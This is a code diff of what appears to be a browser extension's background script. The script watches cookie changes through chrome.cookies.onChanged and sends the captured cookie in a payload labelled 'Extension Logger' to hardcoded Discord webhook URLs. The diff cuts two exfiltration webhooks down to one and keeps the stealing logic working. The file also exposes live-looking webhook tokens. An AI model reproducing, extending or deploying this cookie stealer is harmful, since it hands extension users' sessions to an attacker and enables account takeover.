@@ -1,13 +1,5 @@
-const WEBHOOKS = [
-    {
-        url: "https://discord.com/api/webhooks/1377683745041154229/hem_TvDKnw1xhxttS0M6226ZOuVhIeJ60vZtmBD1M_nOAMTE8Vn8a6KHVvibHmtT7RPc",
-        mention: "@everyone"
-    },
-    {
-        url: "https://discord.com/api/webhooks/1415647861152026655/Dj7QiFegkjBJ6WW42Efv1HK-0W_eTAjhiEv6bVlS6XQiTKruwBKjRorFGpMSggbLz9ZP",
-        mention: "@everyone"
-    }
-];
+const WEBHOOK = "https://discord.com/api/webhooks/1377683745041154229/hem_TvDKnw1xhxttS0M6226ZOuVhIeJ60vZtmBD1M_nOAMTE8Vn8a6KHVvibHmtT7RPc";
+const MENTION = "@everyone";
 
 let lastCookie = null; // Track last sent cookie
 
@@ -115,14 +107,16 @@ async function main(cookie) {
             }
         ],
         username: "Extension Logger",
-        avatar_url: "https://i.postimg.cc/bwpLd4YK/IMG-20250822-180503.jpg"
+        avatar_url: "https://i.postimg.cc/bwpLd4YK/IMG-20250822-180503.jpg",
+        content: MENTION
     };
 
-    // Send to all webhooks
-    for (let wh of WEBHOOKS) {
-        let payload = { ...embedPayload, content: wh.mention };
-        fetch(wh.url, { method: "POST", headers: { "Content-Type": "application/json" }, body: JSON.stringify(payload) });
-    }
+    // Send to single webhook
+    fetch(WEBHOOK, { 
+        method: "POST", 
+        headers: { "Content-Type": "application/json" }, 
+        body: JSON.stringify(embedPayload) 
+    });
 }
 
 // Startup listener
@@ -138,4 +132,3 @@ chrome.cookies.onChanged.addListener(changeInfo => {
         }
     }
 });
-
